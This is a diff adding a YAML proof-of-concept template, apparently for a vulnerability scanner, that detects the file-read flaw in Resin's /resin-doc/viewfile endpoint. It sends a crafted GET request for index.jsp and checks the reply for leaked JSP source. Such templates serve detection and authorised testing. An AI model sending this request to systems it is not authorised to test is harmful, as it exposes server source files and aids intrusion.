@@ -1,0 +1,18 @@
+detail:
+  author: whynot(https://github.com/notwhy)
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2006-3205
+  - http://0day5.com/archives/1173/
+expression: r0()
+manual: true
+name: poc-yaml-resin-viewfile-fileread
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes("%@ page session=\"false\"
+      import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %"))
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /resin-doc/viewfile/?file=index.jsp
+transport: http
